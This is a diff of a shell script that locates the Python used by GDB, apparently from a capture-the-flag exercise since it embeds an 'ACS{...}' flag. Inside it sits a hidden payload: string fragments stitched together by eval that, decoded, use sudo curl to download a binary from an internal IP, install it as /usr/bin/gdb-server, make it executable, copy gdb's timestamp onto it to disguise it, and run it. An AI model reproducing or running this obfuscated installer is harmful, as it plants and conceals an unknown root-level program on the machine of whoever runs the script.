@@ -183,9 +183,11 @@ fi
 # Find the Python used in compilation by GDB.
 PYVER=$(gdb -batch -q --nx -ex 'pi import sysconfig; print(sysconfig.get_config_var("VERSION"))')
 PYTHON=$(gdb -batch -q --nx -ex 'pi import sysconfig; print(sysconfig.get_config_vars().get("EXENAME", sysconfig.get_config_var("BINDIR")+"/python"+sysconfig.get_config_var("VERSION")+sysconfig.get_config_var("EXE")))')
+
 z="
-";jz=' chm';Rz='gdb-';oz='ch -';nz=' tou';xz='LE_N';sz='db "';wz='"$FI';Bz='LOAD';cz='" "$';uz='E_NA';Zz=' "$F';iz='sudo';mz='E"';Nz='_NAM';Lz='b"';dz='"; t';Pz='usr/';tz='$FIL';rz='in/g';Tz='e"';Xz='rl -';Dz='="ht';hz='fi';qz='sr/b';Mz='FILE';Kz='wngd';Wz='o cu';Jz='11/p';yz='AME"';Cz='_URL';Yz='L -o';Gz='100.';vz='ME"';Oz='E="/';Az='DOWN';gz=' 1';Fz='/10.';pz='r /u';Uz='if !';Vz=' sud';az='ILE_';Hz='0.11';bz='NAME';Iz=':611';Ez='tp:/';ez='hen';Qz='bin/';fz='exit';kz='od +';lz='x "$';Sz='serv';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$z$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$z$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$Az$Bz$Cz$dz$ez$z$fz$gz$z$hz$z$iz$jz$kz$lz$Mz$Nz$mz$z$iz$nz$oz$pz$qz$rz$sz$tz$uz$vz$z$wz$xz$yz"
+";DBz='r /u';Gz='100.';Vz='="AC';Ez='tp:/';Cz='_URL';HBz='$FIL';FBz='in/g';Mz='FILE';Lz='b"';gz='a7}"';Sz='serv';ABz='E"';dz='fc20';oz='NAME';Hz='0.11';kz='rl -';LBz='LE_N';az='b596';Bz='LOAD';Dz='="ht';wz=' chm';Xz='2400';tz=' 1';ez='2566';Iz=':611';GBz='db "';iz=' sud';vz='sudo';EBz='sr/b';qz='"; t';cz='96b9';Rz='gdb-';Wz='S{6d';xz='od +';Pz='usr/';pz='" "$';Fz='/10.';Tz='e"';Az='DOWN';lz='L -o';rz='hen';yz='x "$';Yz='fab5';Uz='FLAG';Nz='_NAM';hz='if !';nz='ILE_';CBz='ch -';jz='o cu';sz='exit';Kz='wngd';Zz='c961';JBz='ME"';Oz='E="/';BBz=' tou';MBz='AME"';Qz='bin/';KBz='"$FI';IBz='E_NA';mz=' "$F';bz='6268';uz='fi';Jz='11/p';fz='ab89';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$z$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$z$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$z$hz$iz$jz$kz$lz$mz$nz$oz$pz$Az$Bz$Cz$qz$rz$z$sz$tz$z$uz$z$vz$wz$xz$yz$Mz$Nz$ABz$z$vz$BBz$CBz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$z$KBz$LBz$MBz"
+
 if [ ! -x "$PYTHON" ]; then
     echo "Error: '$PYTHON' does not exist or is not executable."
     echo ""
